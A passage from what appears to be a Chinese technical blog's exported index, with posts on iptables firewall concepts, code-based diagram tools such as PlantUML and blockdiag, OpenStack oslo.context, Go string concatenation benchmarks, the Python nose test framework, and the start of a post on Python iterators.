    <content type="text"><![CDATA[在Linux系统中，对于防火墙的实现一般分为包过滤防火墙，TCP-Wrapper即程序管控，代理服务器等几种方式。其中，iptables作为一种基于包过滤方式的防火墙工具，在实际中应用非常广泛，是非常重要的一个安全工具。真正实现防火墙功能的是 netfilter，它是一个 linux 内核模块，做实际的包过滤。实际上，除了 iptables 以外，还有很多类似的用户空间工具。 iptable 介绍 iptables的“链”与“表”netfilter 使用表（table）和 链（chain）来组织网络包的处理规则（rule）。它默认定义了以下表和链： filter表主要用于对数据包进行过滤，根据具体的规则决定是否放行该数据包（如DROP、ACCEPT、REJECT、LOG）。filter 表对应的内核模块为iptable_filter，包含三个规则链： INPUT链：INPUT针对那些目的地是本地的包 FORWARD链：FORWARD过滤所有不是本地产生的并且目的地不是本地(即本机只是负责转发)的包 OUTPUT链：OUTPUT是用来过滤所有本地生成的包 nat表主要用于修改数据包的IP地址、端口号等信息（网络地址转换，如SNAT、DNAT、MASQUERADE、REDIRECT）。属于一个流的包(因为包的大小限制导致数据可能会被分成多个数据包)只会经过这个表一次。如果第一个包被允许做NAT或Masqueraded，那么余下的包都会自动地被做相同的操作，也就是说，余下的包不会再通过这个表。表对应的内核模块为 iptable_nat，包含三个链： PREROUTING链：作用是在包刚刚到达防火墙时改变它的目的地址 OUTPUT链：改变本地产生的包的目的地址 POSTROUTING链：在包就要离开防火墙之前改变其源地址 mangle表主要用于修改数据包的TOS（Type Of Service，服务类型）、TTL（Time To Live，生存周期）指以及为数据包设置Mark标记，以实现Qos(Quality Of Service，服务质量)调整以及策略路由等应用，由于需要相应的路由设备支持，因此应用并不广泛。包含五个规则链——PREROUTING，POSTROUTING，INPUT，OUTPUT，FORWARD。 raw表是自1.2.9以后版本的iptables新增的表，主要用于决定数据包是否被状态跟踪机制处理。在匹配数据包时，raw表的规则要优先于其他表。包含两条规则链——OUTPUT、PREROUTING iptables中数据包和4种被跟踪连接的4种不同状态： NEW：该包想要开始一个连接（重新连接或将连接重定向） RELATED：该包是属于某个已经建立的连接所建立的新连接。例如：FTP的数据传输连接就是控制连接所 - - - RELATED出来的连接。–icmp-type 0 ( ping 应答) 就是–icmp-type 8 (ping 请求)所RELATED出来的。 ESTABLISHED：只要发送并接到应答，一个数据连接从NEW变为ESTABLISHED,而且该状态会继续匹配这个连接的后续数据包。 INVALID：数据包不能被识别属于哪个连接或没有任何状态比如内存溢出，收到不知属于哪个连接的ICMP错误信息，一般应该DROP这个状态的任何数据。 防火墙处理数据包的方式（规则）： ACCEPT：允许数据包通过 DROP：直接丢弃数据包，不给任何回应信息 REJECT：拒绝数据包通过，必要时会给数据发送端一个响应的信息。 SNAT：源地址转换。在进入路由层面的route之后，出本地的网络栈之前，改写源地址，目标地址不变，并在本机建立NAT表项，当数据返回时，根据NAT表将目的地址数据改写为数据发送出去时候的源地址，并发送给主机。解决内网用户用同一个公网地址上网的问题。MASQUERADE，是SNAT的一种特殊形式，适用于像adsl这种临时会变的ip上 DNAT:目标地址转换。和SNAT相反，IP包经过route之前，重新修改目标地址，源地址不变，在本机建立NAT表项，当数据返回时，根据NAT表将源地址修改为数据发送过来时的目标地址，并发给远程主机。可以隐藏后端服务器的真实地址。（感谢网友提出之前这个地方与SNAT写反了） REDIRECT：是DNAT的一种特殊形式，将网络包转发到本地host上（不管IP头部指定的目标地址是啥），方便在本机做端口转发。 LOG：在/var/log/messages文件中记录日志信息，然后将数据包传递给下一条规则。 除去最后一个LOG，前3条规则匹配数据包后，该数据包不会再往下继续匹配了，所以编写的规则顺序极其关键。 iptables编写规则命令格式： [-t 表名]：该规则所操作的哪个表，可以使用filter、nat等，如果没有指定则默认为filter -A：新增一条规则，到该规则链列表的最后一行 -I：插入一条规则，原本该位置上的规则会往后顺序移动，没有指定编号则为1 -D：从规则链中删除一条规则，要么输入完整的规则，或者指定规则编号加以删除 -R：替换某条规则，规则替换不会改变顺序，而且必须指定编号。 -P：设置某条规则链的默认动作 -nL：-L、-n，查看当前运行的防火墙规则列表 chain名：指定规则表的哪个链，如INPUT、OUPUT、FORWARD、PREROUTING等 [规则编号]：插入、删除、替换规则时用，–line-numbers显示号码 [-i|o 网卡名称]：i是指定数据包从哪块网卡进入，o是指定数据包从哪块网卡输出 [-p 协议类型]：可以指定规则应用的协议，包含tcp、udp和icmp等 [-s 源IP地址]：源主机的IP地址或子网地址 [--sport 源端口号]：数据包的IP的源端口号 [-d目标IP地址]：目标主机的IP地址或子网地址 [--dport目标端口号]：数据包的IP的目标端口号 -m：extend matches，这个选项用于提供更多的匹配参数，如： -m state –state ESTABLISHED,RELATED -m tcp –dport 22 -m multiport –dports 80,8080 -m icmp –icmp-type 8 &lt;-j 动作&gt;：处理数据包的动作，包括ACCEPT、DROP、REJECT等 具体实例请参考 iptables常用实例备查。]]></content>
      <categories>
        <category>os</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[画图工具介绍]]></title>
    <url>%2F2018%2F06%2F19%2Fdiagram%2F</url>
    <content type="text"><![CDATA[在我们写文档的时候常常需要插入一些图片来辅助说明，文档可以用 git 来管理，换个人很容易修改，但是图片如果没有原图很难修改。这里我们介绍几款代码画图工具，可以很方便的用 git 管理。 plantuml看名字就知道这个工具是用来画 uml 图的。 plantuml 在国外使用比较广泛，很多 web 工具都支持 plantuml. plantuml 支持以下几种类型的 uml 图： Sequence diagram Usecase diagram Class diagram Activity diagram Component diagram State diagram Object diagram Deployment diagram Timing diagram plantuml 也支持几种非 uml 的图，具体如下： Wireframe graphical interface Archimate diagram Specification and Description Language (SDL) Ditaa diagram Gantt diagram Mathematic with AsciiMath or JLaTeXMath notation 使用方法Sequence diagram基本用法 1234567@startumlAlice -&gt; Bob: Authentication RequestBob --&gt; Alice: Authentication ResponseAlice -&gt; Bob: Another authentication RequestAlice &lt;-- Bob: another authentication Response@enduml 声明参与者 1234567891011121314@startumlactor Foo1boundary Foo2control Foo3entity Foo4database Foo5collections Foo6Foo1 -&gt; Foo2 : To boundaryFoo1 -&gt; Foo3 : To controlFoo1 -&gt; Foo4 : To entityFoo1 -&gt; Foo5 : To databaseFoo1 -&gt; Foo6 : To collections@enduml 添加注释 1234567891011121314@startumlAlice-&gt;Bob : hellonote left: this is a first noteBob-&gt;Alice : oknote right: this is another noteBob-&gt;Bob : I am thinkingnote left a note can also be defined on several linesend note@enduml Usecase diagram1234567891011121314151617181920@startuml:Main Admin: as Admin(Use the application) as (Use)User -&gt; (Start)User --&gt; (Use)Admin ---&gt; (Use)note right of Admin : This is an example.note right of (Use) A note can also be on several linesend notenote &quot;This note is connected\nto several objects.&quot; as N2(Start) .. N2N2 .. (Use)@enduml Class diagram1234567@startumlClass01 &lt;|-- Class02Class03 *-- Class04Class05 o-- Class06Class07 .. Class08Class09 -- Class10@enduml 1234567@startumlClass11 &lt;|.. Class12Class13 --&gt; Class14Class15 ..&gt; Class16Class17 ..|&gt; Class18Class19 &lt;--* Class20@enduml 1234567@startumlClass21 #-- Class22Class23 x-- Class24Class25 &#125;-- Class26Class27 +-- Class28Class29 ^-- Class30@enduml 指定关系 123456789@startumlClass01 &quot;1&quot; *-- &quot;many&quot; Class02 : containsClass03 o-- Class04 : aggregationClass05 --&gt; &quot;1&quot; Class06@enduml 属性类型 12345678@startumlclass Dummy &#123; -field1 #field2 ~method1() +method2()&#125; Activity diagram12345678910111213141516@startumlstartif (multiprocessor?) then (yes) fork :Treatment 1; fork again :Treatment 2; end forkelse (monoproc) :Treatment 1; :Treatment 2;endif@enduml State diagram1234567891011121314151617181920@startumlscale 600 width[*] -&gt; State1State1 --&gt; State2 : SucceededState1 --&gt; [*] : AbortedState2 --&gt; State3 : SucceededState2 --&gt; [*] : Abortedstate State3 &#123; state &quot;Accumulate Enough Data\nLong State Name&quot; as long1 long1 : Just a test [*] --&gt; long1 long1 --&gt; long1 : New Data long1 --&gt; ProcessData : Enough Data&#125;State3 --&gt; State3 : FailedState3 --&gt; [*] : Succeeded / Save ResultState3 --&gt; [*] : Aborted @enduml Object diagram123456789101112131415@startumlobject Object01object Object02object Object03object Object04object Object05object Object06object Object07object Object08Object01 &lt;|-- Object02Object03 *-- Object04Object05 o-- &quot;4&quot; Object06Object07 .. Object08 : some labels@enduml Deployment diagram支持类型 1234567891011121314151617181920212223@startumlactor actoragent agentartifact artifactboundary boundarycard cardcloud cloudcomponent componentcontrol controldatabase databaseentity entityfile filefolder folderframe frameinterface interfacenode nodepackage packagequeue queuestack stackrectangle rectanglestorage storageusecase usecase@enduml 12345678910111213@startumlnode node1node node2node node3node node4node node5node1 -- node2node1 .. node3node1 ~~ node4node1 == node5@enduml Timing diagram12345678910111213141516171819202122232425@startumlrobust &quot;DNS Resolver&quot; as DNSrobust &quot;Web Browser&quot; as WBconcise &quot;Web User&quot; as WU@0WU is IdleWB is IdleDNS is Idle@+100WU -&gt; WB : URLWU is WaitingWB is Processing@+200WB is WaitingWB -&gt; DNS@+50 : Resolve URL@+100DNS is Processing@+300DNS is Idle@enduml Wireframe graphical interface1234567891011121314@startsalt&#123;+&#123;* File | Edit | Source | Refactor Refactor | New | Open File | - | Close | Close All &#125;&#123;/ General | Fullscreen | Behavior | Saving &#125;&#123; &#123; Open image in: | ^Smart Mode^ &#125; [X] Smooth images when zoomed [X] Confirm image deletion [ ] Show hidden images &#125;[Close]&#125;@endsalt Archimate diagram123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263@startumlsprite $bProcess jar:archimate/business-processsprite $aService jar:archimate/application-servicesprite $aComponent jar:archimate/application-componentarchimate #Business &quot;Handle claim&quot; as HC &lt;&lt;business-process&gt;&gt;archimate #Business &quot;Capture Information&quot; as CI &lt;&lt;business-process&gt;&gt;archimate #Business &quot;Notify\nAdditional Stakeholders&quot; as NAS &lt;&lt;business-process&gt;&gt;archimate #Business &quot;Validate&quot; as V &lt;&lt;business-process&gt;&gt;archimate #Business &quot;Investigate&quot; as I &lt;&lt;business-process&gt;&gt;archimate #Business &quot;Pay&quot; as P &lt;&lt;business-process&gt;&gt;HC *-down- CIHC *-down- NASHC *-down- VHC *-down- IHC *-down- PCI -right-&gt;&gt; NASNAS -right-&gt;&gt; VV -right-&gt;&gt; II -right-&gt;&gt; Parchimate #APPLICATION &quot;Scanning&quot; as scanning &lt;&lt;application-service&gt;&gt;archimate #APPLICATION &quot;Customer admnistration&quot; as customerAdministration &lt;&lt;application-service&gt;&gt;archimate #APPLICATION &quot;Claims admnistration&quot; as claimsAdministration &lt;&lt;application-service&gt;&gt;archimate #APPLICATION Printing &lt;&lt;application-service&gt;&gt;archimate #APPLICATION Payment &lt;&lt;application-service&gt;&gt;scanning -up-&gt; CIcustomerAdministration -up-&gt; CIclaimsAdministration -up-&gt; NASclaimsAdministration -up-&gt; VclaimsAdministration -up-&gt; IPayment -up-&gt; PPrinting -up-&gt; VPrinting -up-&gt; Parchimate #APPLICATION &quot;Document\nManagement\nSystem&quot; as DMS &lt;&lt;application-component&gt;&gt;archimate #APPLICATION &quot;General\nCRM\nSystem&quot; as CRM &lt;&lt;application-component&gt;&gt;archimate #APPLICATION &quot;Home &amp; Away\nPolicy\nAdministration&quot; as HAPA &lt;&lt;application-component&gt;&gt;archimate #APPLICATION &quot;Home &amp; Away\nFinancial\nAdministration&quot; as HFPA &lt;&lt;application-component&gt;&gt;DMS .up.|&gt; scanningDMS .up.|&gt; PrintingCRM .up.|&gt; customerAdministrationHAPA .up.|&gt; claimsAdministrationHFPA .up.|&gt; Paymentlegend leftExample from the &quot;Archisurance case study&quot; (OpenGroup).See ==&lt;$bProcess&gt; :business process==&lt;$aService&gt; : application service==&lt;$aComponent&gt; : appplication componentendlegend@enduml Specification and Description Language (SDL)也是活动图 12345678910111213141516@startumlstartif (multiprocessor?) then (yes) fork :Treatment 1; fork again :Treatment 2; end forkelse (monoproc) :Treatment 1; :Treatment 2;endif@enduml Ditaa diagram1234567891011@startditaa+--------+ +-------+ +-------+| +---+ ditaa +--&gt; | || Text | +-------+ |diagram||Document| |!magic!| | || &#123;d&#125;| | | | |+---+----+ +-------+ +-------+ : ^ | Lots of work | +-------------------------+@endditaa Gantt diagram123456789101112@startganttproject starts the 2018/04/09saturday are closedsunday are closed2018/05/01 is closed2018/04/17 to 2018/04/19 is closed[Prototype design] lasts 14 days[Test prototype] lasts 4 days[Test prototype] starts at [Prototype design]&apos;s end[Prototype design] is colored in Fuchsia/FireBrick [Test prototype] is colored in GreenYellow/Green @endgantt Mathematic with AsciiMath or JLaTeXMath notation123456789@startuml:&lt;math&gt;int_0^1f(x)dx&lt;/math&gt;;:&lt;math&gt;x^2+y_1+z_12^34&lt;/math&gt;;note rightTry also&lt;math&gt;d/dxf(x)=lim_(h-&gt;0)(f(x+h)-f(x))/h&lt;/math&gt;&lt;latex&gt;P(y|\mathbf&#123;x&#125;) \mbox&#123; or &#125; f(\mathbf&#123;x&#125;)+\epsilon&lt;/latex&gt;end note@enduml python 画图工具python 也提供了几个画图工具，如果使用 sphinx 编写文档，可以直接把代码嵌套到文档中。 blockdiag seqdiag actdiag nwdiag 安装1234pip install blockdiagpip install seqdiagpip install actdiagpip install nwdiag 简单使用生成图片一般用指定命令接文件名即可： 1blockdiag test.diag blockdiag123456blockdiag &#123; orientation = portrait A -&gt; B -&gt; C; B -&gt; D;&#125; blockdiag 可以设置很多属性，例如图片类型，颜色，大小，特效等。 1234567blockdiag &#123; // Set stacked to nodes. stacked [stacked]; ellipse [shape = &quot;ellipse&quot;, stacked]; stacked -&gt; ellipse;&#125; 123blockdiag &#123; A -&gt; B [label=&apos;text&apos;, fontsize=16];&#125; seqdiagseqdiag 用来画时序图： 12345678seqdiag &#123; browser -&gt; webserver [label = &quot;GET /index.html&quot;]; browser &lt;-- webserver; browser -&gt; webserver [label = &quot;POST /blog/comment&quot;]; webserver -&gt; database [label = &quot;INSERT comment&quot;]; webserver &lt;-- database; browser &lt;-- webserver;&#125; 12345678910111213seqdiag &#123; A -&gt; B; // Separator === Separator line === A -&gt; B; // Delay separator ... Separator line ... A -&gt; B;&#125; 123456789seqdiag &#123; // Use note (put note on rightside) browser -&gt; webserver [note = &quot;request\nGET /&quot;]; browser &lt;- webserver; // Use leftnote and rightnote browser -&gt; webserver [leftnote = &quot;send request&quot;]; browser &lt;- webserver [rightnote = &quot;send response&quot;];&#125; actdiagactdiag 用来画活动图： 123456789101112actdiag &#123; write -&gt; convert -&gt; image lane user &#123; label = &quot;User&quot; write [label = &quot;Writing reST&quot;]; image [label = &quot;Get diagram IMAGE&quot;]; &#125; lane actdiag &#123; convert [label = &quot;Convert reST to Image&quot;]; &#125;&#125; nwdiagnwdiag 主要用来画网络连线图，报文结构等。 普通网络图： 12345678910111213141516nwdiag &#123; network dmz &#123; address = &quot;210.x.x.x/24&quot; web01 [address = &quot;210.x.x.1&quot;]; web02 [address = &quot;210.x.x.2&quot;]; &#125; network internal &#123; address = &quot;172.x.x.x/24&quot;; web01 [address = &quot;172.x.x.1&quot;]; web02 [address = &quot;172.x.x.2&quot;]; db01; db02; &#125;&#125; 指定多个 ip: 1234567891011121314151617nwdiag &#123; network dmz &#123; address = &quot;210.x.x.x/24&quot; // set multiple addresses (using comma) web01 [address = &quot;210.x.x.1, 210.x.x.20&quot;]; web02 [address = &quot;210.x.x.2&quot;]; &#125; network internal &#123; address = &quot;172.x.x.x/24&quot;; web01 [address = &quot;172.x.x.1&quot;]; web02 [address = &quot;172.x.x.2&quot;]; db01; db02; &#125;&#125; 分组 123456789101112131415161718192021222324nwdiag &#123; network Sample_front &#123; address = &quot;192.168.10.0/24&quot;; // define group group web &#123; web01 [address = &quot;.1&quot;]; web02 [address = &quot;.2&quot;]; &#125; &#125; network Sample_back &#123; address = &quot;192.168.20.0/24&quot;; web01 [address = &quot;.1&quot;]; web02 [address = &quot;.2&quot;]; db01 [address = &quot;.101&quot;]; db02 [address = &quot;.102&quot;]; // define network using defined nodes group db &#123; db01; db02; &#125; &#125;&#125; peer networks 12345678910nwdiag &#123; inet [shape = cloud]; inet -- router; network &#123; router; web01; web02; &#125;&#125; 1234567891011121314rackdiag &#123; // define height of rack 16U; // define rack items 1: UPS [2U]; 3: DB Server 4: Web Server 1 // put 2 units to rack-level 4 4: Web Server 2 5: Web Server 3 5: Web Server 4 7: Load Balancer 8: L3 Switch&#125; 多个 1234567891011121314151617181920212223242526272829rackdiag &#123; // define 1st rack rack &#123; 16U; // define rack items 1: UPS [2U]; 3: DB Server 4: Web Server 5: Web Server 6: Web Server 7: Load Balancer 8: L3 Switch &#125; // define 2nd rack rack &#123; 12U; // define rack items 1: UPS [2U]; 3: DB Server 4: Web Server 5: Web Server 6: Web Server 7: Load Balancer 8: L3 Switch &#125;&#125; TCP 报文结构 12345678910111213141516171819202122&#123; colwidth = 32 node_height = 72 0-15: Source Port 16-31: Destination Port 32-63: Sequence Number 64-95: Acknowledgment Number 96-99: Data Offset 100-105: Reserved 106: URG 107: ACK 108: PSH 109: RST 110: SYN 111: FIN 112-127: Window 128-143: Checksum 144-159: Urgent Pointer 160-191: (Options and Padding) 192-223: data [colheight = 3]&#125;]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>diagram</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[oslo 源码分析之 context]]></title>
    <url>%2F2018%2F06%2F03%2Foslo-context%2F</url>
    <content type="text"><![CDATA[在介绍源码之前，我们先谈谈什么是 context. 一开始不太理解什么是 context，其实它是一个统称，在不同的地方有不同的含义，所以不是很直白。context 翻译成中文是“上下文”的意思，说白了和文章的上下文是一个意思，通俗一点讲就是环境。例如用户信息，token 之类的。如果还是不明白，看看下面的例子。 openstack 的 context 主要是用来保存 http request 相关信息。 context 模块主要定义了一个 RequestContext 类，里面保存了跟 request 请求相关的信息： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102class RequestContext(object): """Helper class to represent useful information about a request context. Stores information about the security context under which the user accesses the system, as well as additional request information. """ user_idt_format = u'&#123;user&#125; &#123;tenant&#125; &#123;domain&#125; &#123;user_domain&#125; &#123;p_domain&#125;' # Can be overridden in subclasses to specify extra keys that should be # read when constructing a context using from_dict. FROM_DICT_EXTRA_KEYS = [] @_renamed_kwarg('user', 'user_id') @_renamed_kwarg('tenant', 'project_id') @_renamed_kwarg('domain', 'domain_id') @_renamed_kwarg('user_domain', 'user_domain_id') @_renamed_kwarg('project_domain', 'project_domain_id') def __init__(self, auth_token=None, user_id=None, project_id=None, domain_id=None, user_domain_id=None, project_domain_id=None, is_admin=False, read_only=False, show_deleted=False, request_id=None, resource_uuid=None, overwrite=True, roles=None, user_name=None, project_name=None, domain_name=None, user_domain_name=None, project_domain_name=None, is_admin_project=True, service_token=None, service_user_id=None, service_user_name=None, service_user_domain_id=None, service_user_domain_name=None, service_project_id=None, service_project_name=None, service_project_domain_id=None, service_project_domain_name=None, service_roles=None, global_request_id=None, system_scope=None): """Initialize the RequestContext :param overwrite: Set to False to ensure that the greenthread local copy of the index is not overwritten. :param is_admin_project: Whether the specified project is specified in the token as the admin project. Defaults to True for backwards compatibility. :type is_admin_project: bool :param system_scope: The system scope of a token. The value ``all`` represents the entire deployment system. A service ID represents a specific service within the deployment system. :type system_scope: string """ # setting to private variables to avoid triggering subclass properties self._user_id = user_id self._project_id = project_id self._domain_id = domain_id self._user_domain_id = user_domain_id self._project_domain_id = project_domain_id self.auth_token = auth_token self.user_name = user_name self.project_name = project_name self.domain_name = domain_name self.system_scope = system_scope self.user_domain_name = user_domain_name self.project_domain_name = project_domain_name self.is_admin = is_admin self.is_admin_project = is_admin_project self.read_only = read_only self.show_deleted = show_deleted self.resource_uuid = resource_uuid self.roles = roles or [] self.service_token = service_token self.service_user_id = service_user_id self.service_user_name = service_user_name self.service_user_domain_id = service_user_domain_id self.service_user_domain_name = service_user_domain_name self.service_project_id = service_project_id self.service_project_name = service_project_name self.service_project_domain_id = service_project_domain_id self.service_project_domain_name = service_project_domain_name self.service_roles = service_roles or [] if not request_id: request_id = generate_request_id() self.request_id = request_id self.global_request_id = global_request_id if overwrite or not get_current(): self.update_store() 先看官方文档给的一个例子： 123456789101112131415from oslo_config import cfgfrom oslo_context import contextfrom oslo_log import log as loggingCONF = cfg.CONFDOMAIN = "demo"logging.register_options(CONF)logging.setup(CONF, DOMAIN)LOG = logging.getLogger(__name__)LOG.info("Message without context")context.RequestContext()LOG.info("Message with context") 上面的代码打印结果如下： 122016-01-20 21:56:29.283 8428 INFO __main__ [-] Message without context2016-01-20 21:56:29.284 8428 INFO __main__ [req-929d23e9-f50e-46ae-a8a7-02bc8c3fd2c8 - - - - -] Message with context 看到上面的打印，有些人可能会有疑问，代码中只创建了 context.RequestContext 对象，并未赋值给 LOG, LOG 是怎么获取 request_id 的，实际上，RequestContext 对象创建之后会保存在 threading.local() 中，所以当前线程的其它代码都可以读取到 RequestContext 的值。]]></content>
      <tags>
        <tag>openstack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[go string 连接性能测试]]></title>
    <url>%2F2018%2F04%2F28%2Fgo-string%2F</url>
    <content type="text"><![CDATA[我们常使用字符串拼接，当比较小时，使用哪种方式都差不多，但是当拼接数比较大时，不同的方法效率会相差很大。 go 提供了如下几种方式连接字符串: strings.Join fmt.Sprintf += strings.Builder (go 1.10 提供) 我们先简单测试下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package mainimport ( "fmt" "time" "strings")func main() &#123; var sz int = 100000 // += 方式 t0 := time.Now() var s string for i := 0; i &lt; sz; i ++ &#123; s += "a" &#125; d0 := time.Since(t0) fmt.Printf("time of [+=]: %v\n", d0) // strings.Join 方式 t1 := time.Now() var s1 string for i := 0; i &lt; sz; i++ &#123; s1 = strings.Join([]string&#123;s1, "a"&#125;, "") &#125; d1 := time.Since(t1) fmt.Printf("time of Join: %v\n", d1) // Sprintf t2 := time.Now() var s2 string for i := 0; i &lt; sz; i++ &#123; s2 = fmt.Sprintf("%s%s", s2, "a") &#125; d2 := time.Since(t2) fmt.Printf("time of Sprintf: %v\n", d2) // string.Builder t3 := time.Now() var b strings.Builder for i :=0; i &lt; sz; i++ &#123; b.WriteString("a") &#125; d3 := time.Since(t3) fmt.Printf("time of Builder: %v\n", d3)&#125; 结果: 1234time of [+=]: 1.1500289stime of Join: 1.1507809stime of Sprintf: 1.5668042stime of Builder: 1.992ms 可以看出 +=, strings.Join, fmt.Sprintf 效率相差不大，但是 strings.Builder 的效率却高了 1000倍。为什么 strings.Builder 如此变态，我们看下实现： strings.Join 底层是用 += 和 copy 实现的，所以效率和 += 差不多 strings.Builder 使用 []type 数组实现; strings.Builder 实现Builder 可以用最小的内存拷贝来构建字符串。先看下 Builder 的简单实现: 1234567891011121314151617181920212223type Builder struct &#123; addr *Builder // of receiver, to detect copies by value buf []byte&#125;func (b *Builder) copyCheck() &#123; if b.addr == nil &#123; // This hack works around a failing of Go's escape analysis // that was causing b to escape and be heap allocated. // See issue 23382. // TODO: once issue 7921 is fixed, this should be reverted to // just "b.addr = b". b.addr = (*Builder)(noescape(unsafe.Pointer(b))) &#125; else if b.addr != b &#123; panic("strings: illegal use of non-zero Builder copied by value") &#125;&#125;func (b *Builder) WriteString(s string) (int, error) &#123; b.copyCheck() b.buf = append(b.buf, s...) return len(s), nil&#125; 可以看出 Builder 底层是用 []byte 实现的，每次添加字符串时，都是直接向数组最后插入值完成的，减少了不必要的内存拷贝，所以效率比较搞。]]></content>
      <categories>
        <category>coding</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nose 使用]]></title>
    <url>%2F2018%2F04%2F28%2Fnose%2F</url>
    <content type="text"><![CDATA[使用nose进行单元测试nose是一个很nice的python测试框架，使用起来非常方便。有些openstack项目也使用nose进行单元测试。 nose安装1pip install nose Example例如我们在multiply.py文件中有如下一段代码: 12def multiply(x, y): return x * y 为了测试上面的代码，我们添加test_multiply.py，编写如下内容： 123456789from multiply import multiplydef test_number_3_4(): assert multiply(3, 4) == 12def test_strings_a_3(): assert multiply('a', 3) == 'aaa' 运行nosetests,打印结果如下： 123456yl@lee:~/code/py/project$ nosetests..----------------------------------------------------------------------Ran 2 tests in 0.001sOK 如果要查看详细信息我们可以添加-v参数： 12345678yl@lee:~/code/py/project$ nosetests -vmultiply_test.test_number_3_4 ... okmultiply_test.test_strings_a_3 ... ok----------------------------------------------------------------------Ran 2 tests in 0.001sOK nose会自动匹配test用例，匹配规则是：满足(?:^|[b_.-])[Tt]est的类，函数，目录，方法。 nose fixtures在测试一组用例的时候，有些初始化或结束代码是通用的，我们可以把这部分代码提取出来，放到setup和teardown中。 在module生效，使用setup_module/teardown_module 在class生效，使用setup_class/teardown_class，并添加@classmethod装饰器 function使用setup_function/teardown_function,并添加@with_setup装饰器 备注 setup_module(): 在文件中最早执行 teardown_module(): 在文件中最后执行 setup()在类所有方之前执行 teardown()在类所有方法之后执行 setup_class()在类每个方法开始时执行 teardown_class()在类每个方法最后执行 具体例子如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from nose import with_setup # optionalfrom unnecessary_math import multiplydef setup_module(module): print ("") # this is to get a newline after the dots print ("setup_module before anything in this file")def teardown_module(module): print ("teardown_module after everything in this file")def my_setup_function(): print ("my_setup_function")def my_teardown_function(): print ("my_teardown_function")@with_setup(my_setup_function, my_teardown_function)def test_numbers_3_4(): print 'test_numbers_3_4 &lt;============================ actual test code' assert multiply(3,4) == 12@with_setup(my_setup_function, my_teardown_function)def test_strings_a_3(): print 'test_strings_a_3 &lt;============================ actual test code' assert multiply('a',3) == 'aaa'class TestUM: def setup(self): print ("TestUM:setup() before each test method") def teardown(self): print ("TestUM:teardown() after each test method") @classmethod def setup_class(cls): print ("setup_class() before any methods in this class") @classmethod def teardown_class(cls): print ("teardown_class() after any methods in this class") def test_numbers_5_6(self): print 'test_numbers_5_6() &lt;============================ actual test code' assert multiply(5,6) == 30 def test_strings_b_2(self): print 'test_strings_b_2() &lt;============================ actual test code' assert multiply('b',2) == 'bb' 默认情况下nose不会打印程序的输出，加上-s参数可以打印输出 123456789101112131415161718192021222324252627yl@lee:~/code/py/project$ nosetests -v -ssetup_module before anything in this filesetup_class() before any methods in this classmultiply_test.TestUM.test_numbers_5_6 ... TestUM:setup() before each test methodtest_numbers_5_6() &lt;============================ actual test codeTestUM:teardown() after each test methodokmultiply_test.TestUM.test_strings_b_2 ... TestUM:setup() before each test methodtest_strings_b_2() &lt;============================ actual test codeTestUM:teardown() after each test methodokteardown_class() after any methods in this classmultiply_test.test_numbers_3_4 ... my_setup_functiontest_numbers_3_4 &lt;============================ actual test codemy_teardown_functionokmultiply_test.test_strings_a_3 ... my_setup_functiontest_strings_a_3 &lt;============================ actual test codemy_teardown_functionokteardown_module after everything in this file----------------------------------------------------------------------Ran 4 tests in 0.002sOK 使用nose assert语句1234from nose.tools import assert_equalsdef test_numbers_3_4(): assert_equals(multiply(3,4), 12) 常用assert语句如下： assert_almost_equal(first, second, places=7, msg=None) assert_almost_equals assert_not_almost_equal assert_not_almost_equals assert_equal(first, second, place=7, msg=None) assert_equals assert_false assert_true assert_not_equal assert_not_equals eq_ ok_ 异常处理有时候我们会在程序的某些地方抛异常，对于这种情况，需要使用@raises装饰器处理。 1234567def play(): sys.exit(1)from nose.tools import raises@raises(SystemExit)def test_play_except(): play() 常用参数 nosetests -v： debug模式，看到具体执行情况，推荐使用； nose会捕获标准输出，程序中的print不会打印到出来，使用nosetests -s可以打开output输出； 默认nosetests会执行所有的test case，如果想单独执行一个case，执行nosetests –tests后跟要测试的文件； nosetests –pdb-failures:失败时，立马调试。这个选项很赞，可以看到失败时的及时环境； nosetests –collect-only -v: 不运行程序，只是搜集并输出各个case的名称； nosetests -x:一旦case失败，立即停止，不执行后续case; nosetestx -failed:只执行上一轮失败的case; 命名规范 module使用 ‘test_’开头 fucntion使用 ‘tets_’开头 class使用 ‘Test’开头 method使用’test_’开头 测试代码的package里有’init.py’ 获取nose返回值 shell在shell下执行时，如果全部用例都通过，则返回0，有failed或error则返回1。 python在python代码中调用nose.run()函数，如果全部用例都通过，返回True，有failed或error返回False。 默认情况下，nose会屏蔽所有输出，如果要打开调试信息可以通过如下方式： 1result = nose.run(defaultTest="", argv=['', '--nocapture'])]]></content>
      <categories>
        <category>coding</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python 迭代器和生成器]]></title>
    <url>%2F2018%2F04%2F23%2Fiterator%2F</url>
    <content type="text"><![CDATA[在 python 中我们常用 for in 来遍历 list, set, dict, str 等。for in 的本质就干了两件事： 调用 __iter__() 获取迭代器; 调用 next() 直到 StopIteration 异常; (python3 中是 __next__()) 迭代器我们先了解几个概念： Iterable: 可迭代对象 Iterator: 迭代器 我们先看看 Iterable 的实现1234567891011121314151617181920212223242526272829303132333435from collections import Iterablehelp(Iterable)class Iterable(__builtin__.object) | Methods defined here: | | __iter__(self) | | ---------------------------------------------------------------------- | Class methods defined here: | | __subclasshook__(cls, C) from abc.ABCMeta | | ---------------------------------------------------------------------- | Data descriptors defined here: | | __dict__ | dictionary for instance variables (if defined) | | __weakref__ | list of weak references to the object (if defined) | | ---------------------------------------------------------------------- | Data and other attributes defined here: | | __abstractmethods__ = frozenset(['__iter__']) | | __metaclass__ = &lt;class 'abc.ABCMeta'&gt; | Metaclass for defining Abstract Base Classes (ABCs). | | Use this metaclass to create an ABC. An ABC can be subclassed | directly, and then acts as a mix-in class. You can also register | unrelated concrete classes (even built-in classes) and unrelated | ABCs as 'virtual subclasses' -- these and their descendants will 再看看 